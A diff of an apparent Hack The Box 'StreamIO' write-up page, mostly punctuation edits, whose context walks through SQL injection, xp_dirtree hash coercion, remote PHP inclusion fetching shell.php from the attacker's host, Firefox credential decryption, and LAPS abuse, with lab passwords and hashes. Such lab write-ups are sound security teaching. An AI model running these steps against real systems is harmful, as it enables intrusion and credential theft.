@@ -54,7 +54,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-streamio/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -199,7 +199,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn&rsquo;t any single vulnerability - it&rsquo;s how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox&rsquo;s credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.</p>
+                <p>Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn&rsquo;t any single vulnerability. It&rsquo;s how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox&rsquo;s credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.</p>
 <h2 id="recon">Recon</h2>
 <p>10.129.11.215, domain <code>streamIO.htb</code>, DC hostname <code>DC</code>. Port 80 had the default IIS page. Port 443 was more interesting: the TLS certificate&rsquo;s Subject Alternative Names listed two hosts, <code>streamIO.htb</code> and <code>watch.streamIO.htb</code>. Standard AD ports alongside: Kerberos, LDAP, SMB, WinRM on 5985.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ nmap -sC -sV -T4 <span class="nv">$DC_IP</span>
@@ -238,7 +238,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 </span></span></code></pre></div><p>The main site at <code>streamIO.htb</code> was a movie streaming platform. The footer had a staff section with names and job titles: Barry (Content manager), Oliver (Web Developer), Samantha (Public affairs manager).</p>
 <p><img src="/images/writeups/htb-streamio/web-streamio-staff-section.png" alt="streamio.htb footer showing staff members Barry, Oliver, and Samantha with their roles"></p>
-<p>I generated username variants and tried AS-REP roasting against all of them. Every account came back <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> - these names don&rsquo;t exist as AD accounts:</p>
+<p>I generated username variants and tried AS-REP roasting against all of them. Every account came back <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. These names don&rsquo;t exist as AD accounts:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ GetNPUsers.py streamIO.htb/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.129.11.215
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 </span></span><span class="line"><span class="cl">
@@ -271,7 +271,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>03:22:04<span class="o">]</span> <span class="o">[</span>CRITICAL<span class="o">]</span> all tested parameters <span class="k">do</span> not appear to be injectable.
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 03:22:04 /2026-06-03/
-</span></span></code></pre></div><p>Fuzzing found a <code>/search.php</code> endpoint. SQLMap triggered the site&rsquo;s blocking mechanism almost immediately - each automated request redirected to <code>blocked.php</code> with an access denied page:</p>
+</span></span></code></pre></div><p>Fuzzing found a <code>/search.php</code> endpoint. SQLMap triggered the site&rsquo;s blocking mechanism almost immediately. Each automated request redirected to <code>blocked.php</code> with an access denied page:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ sqlmap -r search_req 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:01<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;search_req&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:01<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
@@ -285,8 +285,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">got a <span class="m">302</span> redirect to <span class="s1">&#39;https://watch.streamio.htb/blocked.php&#39;</span>. Do you want to follow? <span class="o">[</span>Y/n<span class="o">]</span> n
 </span></span></code></pre></div><p>Manual injection worked fine though. Injecting a single quote into the <code>q</code> parameter produced a Microsoft SQL Server error, confirming the database and the injectable parameter.</p>
 <p><img src="/images/writeups/htb-streamio/web-search-sqli-mssql-error.png" alt="Burp Suite showing POST to search.php with SQLi payload and MSSQL error response in the orange-highlighted box"></p>
-<p>In a union-based injection, you append a <code>UNION SELECT</code> to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query&rsquo;s column count - six columns here, determined by incrementing until the injection stopped erroring.</p>
-<p>I also tried coercing the SQL service&rsquo;s NTLMv2 hash via <code>xp_dirtree</code> pointing at a Responder listener. That worked - but the hash belonged to the <code>DC$</code> machine account, not a user account:</p>
+<p>In a union-based injection, you append a <code>UNION SELECT</code> to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query&rsquo;s column count, six columns here, determined by incrementing until the injection stopped erroring.</p>
+<p>I also tried coercing the SQL service&rsquo;s NTLMv2 hash via <code>xp_dirtree</code> pointing at a Responder listener. That worked, but the hash belonged to the <code>DC$</code> machine account, not a user account:</p>
 <pre tabindex="0"><code>[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
 [SMB] NTLMv2-SSP Username : streamIO\DC$
 [SMB] NTLMv2-SSP Hash     : DC$::streamIO:63c8495b2f15ac52:BC9ECFC7DE5F81A1C8CB9BD865873B43:010100000000000000901E25E5C6D8018E57573EFE652D490000000002000800420055004E00560001001E00570049004E002D004300540054004100430035004D004C00510039004B0004003400570049004E002D004300540054004100430035004D004C00510039004B002E00420055004E0056002E004C004F00430041004C0003001400420055004E0056002E004C004F00430041004C0005001400420055004E0056002E004C004F00430041004C000700080000901E25E5C6D801...
@@ -346,7 +346,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><p><code>yoshihide:66boysandgirls..</code> logged in.</p>
 <h2 id="admin-panel-rfi-and-eval-rce">Admin Panel: RFI and eval() RCE</h2>
 <p><img src="/images/writeups/htb-streamio/web-admin-panel-logged-in.png" alt="streamio.htb admin panel showing User management, Staff management, Movie management, and Leave a message for admin options"></p>
-<p>Each button in the admin panel appended a query parameter: <code>?user=</code>, <code>?staff=</code>, <code>?movie=</code>. Fuzzing for additional parameters with a valid session cookie found a <code>debug</code> parameter. Testing <code>?debug=master.php</code> loaded the Movie management page - so <code>debug</code> was feeding a filename into <code>include()</code> server-side.</p>
+<p>Each button in the admin panel appended a query parameter: <code>?user=</code>, <code>?staff=</code>, <code>?movie=</code>. Fuzzing for additional parameters with a valid session cookie found a <code>debug</code> parameter. Testing <code>?debug=master.php</code> loaded the Movie management page, so <code>debug</code> was feeding a filename into <code>include()</code> server-side.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ ffuf -u <span class="s2">&#34;https://streamio.htb/admin/index.php?FUZZ=master.php&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H <span class="s2">&#34;Cookie: PHPSESSID=fflo9cp8c2nkda0rq73klq9cfs&#34;</span> -fw <span class="m">85</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">debug                   <span class="o">[</span>Status: 200, Size: 343060, Words: 17814, Lines: 11171, Duration: 94ms<span class="o">]</span>
@@ -355,7 +355,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">user                    <span class="o">[</span>Status: 200, Size: 2444, Words: 206, Lines: 75, Duration: 69ms<span class="o">]</span>
 </span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>6453/6453<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">457</span> req/sec :: Duration: <span class="o">[</span>0:00:14<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </span></span></code></pre></div><p>The next question was whether it could load a remote URL instead of a local path. Remote File Inclusion works when PHP&rsquo;s <code>allow_url_include</code> is enabled. If <code>include()</code> accepts URLs, pointing it at a file on my machine would make the PHP server fetch my file and execute it.</p>
-<p>Before testing blind, I used it to read the server&rsquo;s own source code first - pointing <code>include</code> at the local <code>master.php</code> path to leak it:</p>
+<p>Before testing blind, I used it to read the server&rsquo;s own source code first, pointing <code>include</code> at the local <code>master.php</code> path to leak it:</p>
 <p><img src="/images/writeups/htb-streamio/web-rfi-master-php-source-code.png" alt="Burp Suite POST request with include parameter pointing to master.php, response showing PHP source code with eval(file_get_contents($_POST[‘include’])) highlighted"></p>
 <p>The relevant section at the bottom of master.php:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;include&#39;</span><span class="p">]))</span>
@@ -365,7 +365,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="s2">&#34; ---- ERROR ---- &#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p><code>eval(file_get_contents($_POST['include']))</code> - it fetches whatever URL or path you pass in the <code>include</code> POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with <code>system()</code> calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that <code>index.php</code> is blocked by name check.</p>
+</span></span></code></pre></div><p><code>eval(file_get_contents($_POST['include']))</code>. It fetches whatever URL or path you pass in the <code>include</code> POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with <code>system()</code> calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that <code>index.php</code> is blocked by name check.</p>
 <p>Source code also leaked the database credentials: <code>db_admin:B1@hx31234567890</code>.</p>
 <p>The execution chain: POST to <code>/admin/?debug=master.php</code> with <code>include=http://10.10.16.129:9000/shell.php</code>. Tested with a directory listing first:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ cat &gt; shell.php
@@ -394,7 +394,7 @@ include=http://10.10.16.129:9000/shell.php
 02/22/2022  02:33 AM    &lt;DIR&gt;          Public
                0 File(s)              0 bytes
                8 Dir(s)   7,176,941,568 bytes free
-</code></pre><p>Shell as <code>yoshihide</code>. <code>whoami /all</code> confirmed this is the IIS application pool account - equivalent to <code>www-data</code> on Linux:</p>
+</code></pre><p>Shell as <code>yoshihide</code>. <code>whoami /all</code> confirmed this is the IIS application pool account, equivalent to <code>www-data</code> on Linux:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami /all
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">USER INFORMATION
@@ -430,7 +430,7 @@ include=http://10.10.16.129:9000/shell.php
 </span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span> Enabled
 </span></span></code></pre></div><p>No interesting privileges, no access to other users&rsquo; directories.</p>
 <h2 id="lateral-movement-to-nikk37">Lateral Movement to nikk37</h2>
-<p><code>C:\Users\</code> showed Administrator, Martin, nikk37, and Public. <code>yoshihide</code> wasn&rsquo;t there - the web account doesn&rsquo;t have a home directory.</p>
+<p><code>C:\Users\</code> showed Administrator, Martin, nikk37, and Public. <code>yoshihide</code> wasn&rsquo;t there. The web account doesn&rsquo;t have a home directory.</p>
 <p>The database credentials from the source code were usable. <code>sqlcmd</code> from the shell:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\i</span>netpub<span class="se">\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class="s2">&#34;B1@hx31234567890&#34;</span> -Q <span class="s2">&#34;SELECT name FROM sys.databases&#34;</span>
 </span></span><span class="line"><span class="cl">name                                                                                                                            
@@ -443,7 +443,7 @@ include=http://10.10.16.129:9000/shell.php
 </span></span><span class="line"><span class="cl">streamio_backup                                                                                                                 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">(</span><span class="m">6</span> rows affected<span class="o">)</span>
-</span></span></code></pre></div><p>Six databases, including one that wasn&rsquo;t in the original enumeration: <code>streamio_backup</code>. Same schema as the main database - movies and users tables:</p>
+</span></span></code></pre></div><p>Six databases, including one that wasn&rsquo;t in the original enumeration: <code>streamio_backup</code>. Same schema as the main database, movies and users tables:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\i</span>netpub<span class="se">\s</span>treamio.htb&gt;sqlcmd -S localhost -U db_admin -P <span class="s2">&#34;B1@hx31234567890&#34;</span> -d streamio_backup -Q <span class="s2">&#34;SELECT table_name FROM information_schema.tables&#34;</span>
 </span></span><span class="line"><span class="cl">table_name                                                                                                                      
 </span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------------------------------
@@ -475,7 +475,7 @@ include=http://10.10.16.129:9000/shell.php
 ╚     https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
 
     [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
-</code></pre><p>Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password - if no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in <code>logins.json</code>, the key material in <code>key4.db</code>, and the certificate database in <code>cert9.db</code>. Downloaded all three, then ran them through firepwd:</p>
+</code></pre><p>Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password. If no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in <code>logins.json</code>, the key material in <code>key4.db</code>, and the certificate database in <code>cert9.db</code>. Downloaded all three, then ran them through firepwd:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/streamIO/firefox ❯ python3 firepwd/firepwd.py -d .
 </span></span><span class="line"><span class="cl">globalSalt: b<span class="s1">&#39;d215c391179edb56af928a06c627906bcbd4bd47&#39;</span>
 </span></span><span class="line"><span class="cl"> SEQUENCE <span class="o">{</span>
@@ -541,7 +541,7 @@ include=http://10.10.16.129:9000/shell.php
 <p><img src="/images/writeups/htb-streamio/bloodhound-jdgodd-owns-core-staff.png" alt="BloodHound graph showing JDGODD@STREAMIO.HTB has Owns and WriteOwner edges to CORE STAFF@STREAMIO.HTB group"></p>
 <p><img src="/images/writeups/htb-streamio/bloodhound-core-staff-readlaps-dc.png" alt="BloodHound graph showing CORE STAFF@STREAMIO.HTB has a ReadLAPSPassword edge to DC.STREAMIO.HTB"></p>
 <p><code>JDgodd → Owns Core Staff → Core Staff → ReadLAPSPassword → DC</code>.</p>
-<p>JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL - the list of who has what permissions on the object. Ownership alone doesn&rsquo;t grant membership, but it does let you modify the group&rsquo;s access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC&rsquo;s computer object.</p>
+<p>JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL, the list of who has what permissions on the object. Ownership alone doesn&rsquo;t grant membership, but it does let you modify the group&rsquo;s access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC&rsquo;s computer object.</p>
 <p>LAPS stores the DC&rsquo;s local Administrator password as the <code>ms-Mcs-AdmPwd</code> attribute on the computer object in AD. Any member of a group with ReadLAPSPassword access can query that attribute and read the current password directly.</p>
 <p>From nikk37&rsquo;s WinRM session, using JDgodd&rsquo;s credentials as a PSCredential object:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">&gt;</span> <span class="nv">$pass</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
@@ -709,6 +709,11 @@ include=http://10.10.16.129:9000/shell.php
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
